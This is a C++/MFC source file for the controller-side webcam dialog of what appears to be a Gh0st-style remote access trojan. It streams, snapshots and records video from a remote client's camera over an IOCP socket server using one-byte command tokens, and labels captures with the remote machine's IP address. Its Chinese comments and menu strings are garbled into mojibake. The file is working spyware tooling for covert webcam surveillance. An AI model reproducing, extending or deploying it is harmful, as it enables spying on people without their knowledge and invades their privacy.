// WebCamDlg.cpp : implementation file
//

#include "stdafx.h"
#include "DHL_yk.h"
#include "WebCamDlg.h"
#include "Dib.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

enum
{
	IDM_ENABLECOMPRESS = 0x0010,	// ��Ƶѹ��
	IDM_SAVEDIB,					// �������
	IDM_SAVEAVI,					// ����¼��
	IDM_SIZE_176_144,				// ��Ƶ�ֱ���, H263ֻ֧��������
	IDM_SIZE_352_288
};

/////////////////////////////////////////////////////////////////////////////
// CWebCamDlg dialog

CWebCamDlg::CWebCamDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CWebCamDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CWebCamDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_WEBCAM));
	m_nCount		= 0;
	m_lpbmi			= NULL;
	m_lpScreenDIB	= NULL;
	m_lpCompressDIB	= NULL;
	m_pVideoCodec	= NULL;

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	
	m_nOldWidth = 0;

	ResetScreen();

}

void CWebCamDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CWebCamDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CWebCamDlg, CDialog)
	//{{AFX_MSG_MAP(CWebCamDlg)
	ON_WM_CLOSE()
	ON_WM_PAINT()
	ON_WM_SYSCOMMAND()
	ON_WM_SHOWWINDOW()
	ON_WM_SIZE()
	ON_MESSAGE(WM_GETMINMAXINFO, OnGetMiniMaxInfo)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CWebCamDlg message handlers

void CWebCamDlg::OnReceive()
{
	CString str;
	str.Format("\\\\%s %d * %d ", m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
	SetWindowText(str);	
}

void CWebCamDlg::OnReceiveComplete()
{
	m_nCount++;
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_WEBCAM_DIB:
		DrawDIB();
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // ��Ƶ��С�����ɹ�
		ResetScreen();
		break;
	default:
		// ���䷢���쳣����
		SendException();
		break;
	}
}

HANDLE DDB2DIB( HBITMAP bitmap) 
{
	//Define Variable
	BITMAP				bm;
	BITMAPINFOHEADER	bi;
    LPBITMAPINFOHEADER 	lpbi;
	DWORD				dwLen;
	HANDLE				hDib;
	HANDLE				handle;
	HDC 				hdc;
	HPALETTE			hPal;

	hPal = (HPALETTE) GetStockObject(DEFAULT_PALETTE );

	// get bitmap information
	GetObject(bitmap,sizeof(bm),(LPSTR)&bm);

	// initialize the bitmapinfoheader
	bi.biSize			= sizeof(BITMAPINFOHEADER);
	bi.biWidth			= bm.bmWidth;
	bi.biHeight 		= bm.bmHeight;
	bi.biPlanes 		= 1;
	bi.biBitCount		= bm.bmPlanes * bm.bmBitsPixel;
	bi.biBitCount		= 24;
	bi.biCompression	= BI_RGB;
	bi.biSizeImage		= 0;
	bi.biXPelsPerMeter	= 0;
	bi.biYPelsPerMeter	= 0;
	bi.biClrUsed		= 0;
	bi.biClrImportant	= 0;

	// compute the size of the  infoheader and the color table
	int ncolors = (1 << bi.biBitCount); 
	if( ncolors> 256 ) 
		ncolors = 0;
	dwLen  = bi.biSize + ncolors * sizeof(RGBQUAD);

	// we need a device context to get the dib from
	hdc = GetDC(NULL);
	hPal = SelectPalette(hdc,hPal,FALSE);
	RealizePalette(hdc);

	// allocate enough memory to hold bitmapinfoheader and color table
	hDib = GlobalAlloc(GMEM_FIXED,dwLen);

	if (!hDib){
		SelectPalette(hdc,hPal,FALSE);
		ReleaseDC(NULL,hdc);
		return NULL;
	}

	lpbi = (LPBITMAPINFOHEADER)hDib;

	*lpbi = bi;

	// call getdibits with a NULL lpbits param, so the device driver 
	// will calculate the bisizeimage field 
	GetDIBits(hdc, bitmap, 0L, (DWORD)bi.biHeight,
			(LPBYTE)NULL, (LPBITMAPINFO)lpbi, (DWORD)DIB_RGB_COLORS );

	bi = *lpbi;

	// if the driver did not fill in the bisizeimage field, then compute it
	// each scan line of the image is aligned on a dword (32bit) boundary
	if (bi.biSizeImage == 0)
	{
		bi.biSizeImage = ((((bi.biWidth * bi.biBitCount) + 31) & ~31) / 8) 
						* bi.biHeight;
	}

	// realloc the buffer so that it can hold all the bits
	dwLen += bi.biSizeImage;
	if (handle = GlobalReAlloc(hDib, dwLen, GMEM_MOVEABLE))
		hDib = handle;
	else
	{
		GlobalFree(hDib);

		// reselect the original palette
		SelectPalette(hdc,hPal,FALSE);
		ReleaseDC(NULL,hdc);
		return NULL;
	}

	// get the bitmap bits
	lpbi = (LPBITMAPINFOHEADER)hDib;

	// finally get the dib
	BOOL bgotbits = GetDIBits( hdc, bitmap,
				0L,								// start scan line
				(DWORD)bi.biHeight,				// # of scan lines
				(LPBYTE)lpbi 					// address for bitmap bits
				+ (bi.biSize + ncolors * sizeof(RGBQUAD)),
				(LPBITMAPINFO)lpbi,				// address of bitmapinfo
				(DWORD)DIB_RGB_COLORS);			// use rgb for color table

	if( !bgotbits )
	{
		GlobalFree(hDib);
		
		SelectPalette(hdc,hPal,FALSE);
		ReleaseDC(NULL,hdc);
		return NULL;
	}

	SelectPalette(hdc,hPal,FALSE);
	ReleaseDC(NULL,hdc);

	return hDib;
}

HBITMAP CWebCamDlg::My_GetBitmap(HWND hWnd)
{
	HDC hWndDC = NULL;
	HDC hMemDC = NULL;
	HBITMAP hMemBmp = NULL;
	HBITMAP hOldBmp = NULL;
	RECT rect;
	int w0 = 0, h0 = 0;
	int w1 = 0, h1 = 0;
	int ws = 0, hs = 0;

	if(hWnd == NULL)
	{
		hWnd = ::GetDesktopWindow();
	}
	hWndDC = ::GetWindowDC(hWnd);
	hMemDC = ::CreateCompatibleDC(hWndDC);
/*	::GetWindowRect(hWnd, &rect);

	w = rect.right - rect.left-12;
	h = rect.bottom - rect.top-32;

	hMemBmp = ::CreateCompatibleBitmap(hWndDC, w, h);

	hOldBmp = (HBITMAP)::SelectObject(hMemDC, hMemBmp);
	::BitBlt(hMemDC, -6, -26, w+6, h+26, hWndDC, 0, 0, SRCCOPY);
*/
	::GetWindowRect(hWnd, &rect);  //���ڳߴ�
	w0 = rect.right - rect.left;
	h0 = rect.bottom - rect.top;

	::GetClientRect(hWnd, &rect);  //��Ƶ�ߴ�
	w1 = rect.right - rect.left;
	h1 = rect.bottom - rect.top;

	hMemBmp = ::CreateCompatibleBitmap(hWndDC, w1, h1);

	ws = (w0 - w1 ) /2;
	hs = h0 - h1 - ws;
	w0 = 0 - ws;
	h0 = 0 - hs;
	w1 = w1 + ws;
	h1 = h1 + hs;

	hOldBmp = (HBITMAP)::SelectObject(hMemDC, hMemBmp);
	::BitBlt(hMemDC, w0, h0, w1, h1, hWndDC, 0, 0, SRCCOPY);

	// Why???
	hMemBmp = (HBITMAP)::SelectObject(hMemDC, hOldBmp);

	::DeleteObject(hOldBmp);
	::ReleaseDC(NULL, hMemDC);
	::ReleaseDC(NULL, hWndDC);

	return hMemBmp;
}

bool CWebCamDlg::SaveSnapshot()
{
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.bmp");
	CFileDialog dlg(FALSE, "bmp", strFileName, OFN_OVERWRITEPROMPT, "λͼ�ļ�(*.bmp)|*.bmp|", this);
	if(dlg.DoModal () != IDOK)
		return false;

	HBITMAP hBmp = My_GetBitmap(this->m_hWnd);
	HANDLE hDib;
	hDib = DDB2DIB(hBmp);

	CDib dib;
	dib.WriteBMPFile(strFileName,(LPBYTE)hDib);
	
	return true;
}
/*
bool CWebCamDlg::SaveSnapshot()
{

	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.bmp");
	CFileDialog dlg(FALSE, "bmp", strFileName, OFN_OVERWRITEPROMPT, "λͼ�ļ�(*.bmp)|*.bmp|", this);
	if(dlg.DoModal () != IDOK)
		return false;

	BITMAPFILEHEADER	hdr;
	LPBITMAPINFO		lpbi = m_lpbmi;
	CFile	file;
	if (!file.Open( dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox("�ļ�����ʧ��");
		return false;
	}
*/
//	CDib dib;
//	dib.WriteBMPFile(strFileName,(LPBYTE)hDib);
/*
	// BITMAPINFO��С
	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
	
	// Fill in the fields of the file header
	hdr.bfType			= ((WORD) ('M' << 8) | 'B');	// is always "BM"
	hdr.bfSize			= lpbi->bmiHeader.biSizeImage + sizeof(hdr);
	hdr.bfReserved1 	= 0;
	hdr.bfReserved2 	= 0;
	hdr.bfOffBits		= sizeof(hdr) + nbmiSize;
	// Write the file header
	file.Write(&hdr, sizeof(hdr));
	file.Write(lpbi, nbmiSize);
	// Write the DIB header and the bits
	file.Write(m_lpScreenDIB, lpbi->bmiHeader.biSizeImage);
	file.Close();
*/
	// BITMAPINFO��С
//	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
/*	
    hdr.bfType = 0x4d42;
    hdr.bfReserved1 = 0;
    hdr.bfReserved2 = 0;
    hdr.bfOffBits = sizeof(hdr) + nbmiSize;//sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER ) + PaletteSize((LPSTR) lpDIB );
    hdr.bfSize = lpbi->bmiHeader.biSizeImage + sizeof(hdr);//(hdr.bfOffBits + ((LPBITMAPINFOHEADER)lpDIB)->biHeight * BytesPerLine((LPBITMAPINFOHEADER)lpDIB))/4;

	// Fill in the fields of the file header
	hdr.bfType			= ((WORD) ('M' << 8) | 'B');	// is always "BM"
	hdr.bfSize			= lpbi->bmiHeader.biSizeImage + sizeof(hdr);
	hdr.bfReserved1 	= 0;
	hdr.bfReserved2 	= 0;
	hdr.bfOffBits		= sizeof(hdr) + nbmiSize;

	// Write the file header
	file.Write(&hdr, sizeof(hdr));
	file.Write(lpbi, nbmiSize);
	// Write the DIB header and the bits
	file.Write(m_lpScreenDIB, lpbi->bmiHeader.biSizeImage);
	file.Close();
*/
/*
	HBITMAP hBmp = My_GetBitmap(this->m_hWnd);
	HANDLE hDib;
	hDib = DDB2DIB(hBmp);

	CDib dib;
	dib.WriteBMPFile(strFileName,(LPBYTE)hDib);
*/
	/*
	HBITMAP hBmp = My_GetBitmap(this->m_hWnd);
	HANDLE hDib;
	hDib = DDB2DIB(hBmp);

	CDib dib;
	char name[30];
	wsprintf(name,"ͼƬ(%d).bmp",nBmpCount);
	dib.WriteBMPFile(name,(LPBYTE)hDib);
	nBmpCount++;
*/
/*	
	return true;
}

*/

void CWebCamDlg::SaveAvi()
{
	CMenu	*pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu->GetMenuState(IDM_SAVEAVI, MF_BYCOMMAND) & MF_CHECKED)
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_UNCHECKED);
		m_aviFile = "";
		m_aviStream.Close();
		return;
	}

	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.avi");
	CFileDialog dlg(FALSE, "avi", strFileName, OFN_OVERWRITEPROMPT, "��Ƶ�ļ�(*.avi)|*.avi|", this);
	if(dlg.DoModal () != IDOK)
		return;
	m_aviFile = dlg.GetPathName();
	if (!m_aviStream.Open(m_aviFile, m_lpbmi))
	{
		m_aviFile = "";
		MessageBox("����¼���ļ�ʧ��");	
	}
	else
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_CHECKED);
	}

}
void CWebCamDlg::SendException()
{
	BYTE	bBuff = COMMAND_EXCEPTION;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

BOOL CWebCamDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

LRESULT	CWebCamDlg::OnGetMiniMaxInfo(WPARAM wParam, LPARAM lparam)
{	
	// ���m_MMI�Ѿ�����ֵ
	if (m_MMI.ptMaxSize.x > 0)
		memcpy((void *)lparam, &m_MMI, sizeof(MINMAXINFO));
	
	return NULL;
}

void CWebCamDlg::InitMMI()
{
	RECT	rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	ClientToScreen(&rectClient);
	// �߿�Ŀ��
	int	nBorderWidth = rectClient.left - rectWindow.left;
	
	rectWindow.right = rectClient.left + nBorderWidth + m_lpbmi->bmiHeader.biWidth;
	rectWindow.bottom = rectClient.top + nBorderWidth + m_lpbmi->bmiHeader.biHeight;

	// �������ڵ�Զ�̴�С
 	MoveWindow(&rectWindow);

	int	nTitleWidth = rectClient.top - rectWindow.top; // �������ĸ߶�
	int	nWidthAdd = nBorderWidth * 2;
	int	nHeightAdd = nTitleWidth + nBorderWidth;

	int	nMaxWidth = GetSystemMetrics(SM_CXSCREEN);
	int	nMaxHeight = GetSystemMetrics(SM_CYSCREEN);
	// ��С��Track�ߴ�
	m_MMI.ptMinTrackSize.x = m_lpbmi->bmiHeader.biWidth + nWidthAdd;
	m_MMI.ptMinTrackSize.y = m_lpbmi->bmiHeader.biHeight + nHeightAdd;


	// ���ʱ���ڵ�λ��
	m_MMI.ptMaxPosition.x = 1;
	m_MMI.ptMaxPosition.y = 1;
	// �������ߴ�
	m_MMI.ptMaxSize.x = nMaxWidth;
	m_MMI.ptMaxSize.y = nMaxHeight;
	
	// ����Track�ߴ�ҲҪ�ı�
	m_MMI.ptMaxTrackSize.x = nMaxWidth;
	m_MMI.ptMaxTrackSize.y = nMaxHeight;

}

void CWebCamDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	// ����ʱ�Ƴ��Լ�����ͼ�е�����

	// �������¼��ֹͣ
	if (!m_aviFile.IsEmpty())
		SaveAvi();


	::ReleaseDC(m_hWnd, m_hDC);
	DrawDibClose(m_hDD);

//	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	
	if (m_lpbmi) 
		delete [] m_lpbmi;
	if (m_lpScreenDIB)
		delete [] m_lpScreenDIB;
	if (m_lpCompressDIB)
		delete [] m_lpCompressDIB;
	if (m_pVideoCodec)
		delete m_pVideoCodec;

	CDialog::OnClose();
}

BOOL CWebCamDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_STRING, IDM_ENABLECOMPRESS, "��Ƶѹ��(&C)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "�������(&S)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI, "����¼��(&V)");
		pSysMenu->AppendMenu(MF_SEPARATOR);	
		pSysMenu->AppendMenu(MF_STRING, IDM_SIZE_176_144, "176 * 144");
		pSysMenu->AppendMenu(MF_STRING, IDM_SIZE_352_288, "352 * 288");

		// ��֧�̶ֹ��Ĵ�С��˵��Զ����Ƶ�й̶��Ĵ�С����������ʧЧ 
		if ((m_lpbmi->bmiHeader.biWidth != 352 && m_lpbmi->bmiHeader.biWidth != 288)
			&& (m_lpbmi->bmiHeader.biWidth != 176 && m_lpbmi->bmiHeader.biWidth != 144))
		{
			pSysMenu->EnableMenuItem(IDM_SIZE_176_144, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
			pSysMenu->EnableMenuItem(IDM_SIZE_352_288, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		}
		else
			pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_352_288, MF_BYCOMMAND);

	}

	CString str;
	str.Format("\\\\%s %d * %d", m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
	SetWindowText(str);
	// ��ʼ�����ڴ�С�ṹ
	InitMMI();

	m_hDD = DrawDibOpen();
	m_hDC = ::GetDC(m_hWnd);

	// ֪ͨԶ�̿��ƶ˶Ի����Ѿ���
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

//	nBmpCount=0;

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CWebCamDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case IDM_ENABLECOMPRESS:
		{
			bool bIsChecked = pSysMenu->GetMenuState(IDM_ENABLECOMPRESS, MF_BYCOMMAND) & MF_CHECKED;
			pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
			bIsChecked = !bIsChecked;
			BYTE	bToken = COMMAND_WEBCAM_ENABLECOMPRESS;
			if (!bIsChecked)
				bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
			m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
		}
		break;
	case IDM_SAVEDIB:
		SaveSnapshot();
		break;
	case IDM_SAVEAVI:
		SaveAvi();
		break;
	case IDM_SIZE_176_144:
		{
			if (SendResetScreen(176, 144))
				pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_176_144, MF_BYCOMMAND);
		}
		break;
	case IDM_SIZE_352_288:
		{
			if (SendResetScreen(352, 288))
				pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_352_288, MF_BYCOMMAND);
		}
		break;
	default:
		CDialog::OnSysCommand(nID, lParam);
	}
}

void CWebCamDlg::SendNext()
{
	BYTE	bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CWebCamDlg::DrawDIB()
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu == NULL)
		return;
	// token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 + 1 + 4;

	LPBYTE	lpBuffer = m_pContext->m_DeCompressionBuffer.GetBuffer();
	UINT	nBufferLen = m_pContext->m_DeCompressionBuffer.GetBufferLen();
	if (lpBuffer[1] == 0) // û�о���H263ѹ����ԭʼ���ݣ�����Ҫ����
	{
		// ��һ�Σ�û��ѹ����˵������˲�֧��ָ���Ľ�����
		if (m_nCount == 1)
		{
			pSysMenu->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		}
		pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_UNCHECKED);
		memcpy(m_lpScreenDIB, lpBuffer + nHeadLen, nBufferLen - nHeadLen);
	}
	else // ����
	{
		InitCodec(*(LPDWORD)(lpBuffer + 2));
		if (m_pVideoCodec != NULL)
		{
			pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_CHECKED);
			memcpy(m_lpCompressDIB, lpBuffer + nHeadLen, nBufferLen - nHeadLen);
			m_pVideoCodec->DecodeVideoData(m_lpCompressDIB, nBufferLen - nHeadLen, 
				(LPBYTE)m_lpScreenDIB, NULL,  NULL);
		}
	}
	OnPaint();
}

void CWebCamDlg::InitCodec(DWORD fccHandler)
{
	if (m_pVideoCodec != NULL)
		return;

	m_pVideoCodec = new CVideoCodec;
	if (!m_pVideoCodec->InitCompressor(m_lpbmi, fccHandler))
	{
		delete m_pVideoCodec;
		// ��NULL, ����ʱ�ж��Ƿ�ΪNULL���ж��Ƿ�ѹ��
		m_pVideoCodec = NULL;
		// ֪ͨ����˲�����ѹ��
		BYTE bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
		GetSystemMenu(FALSE)->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
	}	
}

bool CWebCamDlg::SendResetScreen(int nWidth, int nHeight)
{
	if (GetSystemMenu(FALSE)->GetMenuState(IDM_SAVEAVI, MF_BYCOMMAND) & MF_CHECKED)
	{
		MessageBox("����¼���У����ܵ�����Ƶ��С");
		return false;
	}
	BYTE	bPacket[9];
	bPacket[0] = COMMAND_WEBCAM_RESIZE;
	*((LPDWORD)&bPacket[1]) = nWidth;
	*((LPDWORD)&bPacket[5]) = nHeight;
	m_iocpServer->Send(m_pContext, bPacket, sizeof(bPacket));

	return true;
}

void CWebCamDlg::ResetScreen()
{
	if (m_lpbmi)
	{
		delete m_lpbmi;
		m_lpbmi = NULL;
	}
	if (m_lpScreenDIB)
	{
		delete m_lpScreenDIB;
		m_lpScreenDIB = NULL;
	}
	if (m_lpCompressDIB)
	{
		delete m_lpCompressDIB;
		m_lpCompressDIB = NULL;
	}

	if (m_pVideoCodec)
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}

	int	nBmiSize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_lpbmi	= (LPBITMAPINFO) new BYTE[nBmiSize];
	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBmiSize);

	m_lpScreenDIB	= new BYTE[m_lpbmi->bmiHeader.biSizeImage];
	m_lpCompressDIB	= new BYTE[m_lpbmi->bmiHeader.biSizeImage];
	
	memset(&m_MMI, 0, sizeof(MINMAXINFO));
	if (IsWindowVisible())
		InitMMI();
}

void CWebCamDlg::OnPaint() 
{
	// TODO: Add your message handler code here
	CPaintDC dc(this); // device context for painting
	RECT rect;
	GetClientRect(&rect);

//	StretchDIBits�����ã���Щʱ��ử������
	/*
	StretchDIBits
		(
		m_hDC,
		0, 0, rect.right, rect.bottom, 
		0, 0, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, 
		(LPBYTE)m_lpScreenDIB, 
		m_lpbmi, 
		DIB_RGB_COLORS, 
		SRCCOPY
		);
	*/
	DrawDibDraw
		(
		m_hDD, 
		m_hDC,
		0, 0,
		rect.right, rect.bottom,
		(LPBITMAPINFOHEADER)m_lpbmi,
		m_lpScreenDIB,
		0, 0,
		m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, 
		DDF_SAME_HDC
		);

	LPCTSTR	lpTipsString = "¼���� ...";
	// д��¼���ļ�
	if (!m_aviFile.IsEmpty())
	{
		m_aviStream.Write(m_lpScreenDIB);
		// ��ʾ����¼��
		SetBkMode(m_hDC, TRANSPARENT);
		SetTextColor(m_hDC, RGB(0xff,0x00,0x00));
		TextOut(m_hDC, 5, 5, lpTipsString, lstrlen(lpTipsString));
	}

	// Do not call CDialog::OnPaint() for painting messages
}

void CWebCamDlg::OnShowWindow(BOOL bShow, UINT nStatus) 
{
	CDialog::OnShowWindow(bShow, nStatus);
	
	// TODO: Add your message handler code here
	
}

void CWebCamDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	if (!IsWindowVisible())
		return;

	// �������������ڴ�С
	int	x = m_lpbmi->bmiHeader.biWidth, y = m_lpbmi->bmiHeader.biHeight; // x:y

	RECT	rectClientToScreen, rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	GetClientRect(&rectClientToScreen);
	ClientToScreen(&rectClientToScreen);  
	// �߿�Ŀ��
	int	nBorderWidth = rectClientToScreen.left - rectWindow.left;

	int	nWindowWidth = rectWindow.right - rectWindow.left;
	int	nWindowHeight = rectWindow.bottom - rectWindow.top;
	
	// �����仯
	if (m_nOldWidth != nWindowWidth)
		rectWindow.bottom = rectClientToScreen.top + nBorderWidth + (rectClient.right * y) / x;
	else
		rectWindow.right = rectClientToScreen.left + nBorderWidth + (rectClient.bottom * x) / y;
	   
	m_nOldWidth = nWindowWidth;

	MoveWindow(&rectWindow);
	
	OnPaint();
	// TODO: Add your message handler code here
	
}

void CWebCamDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
	CDialog::PostNcDestroy();
}
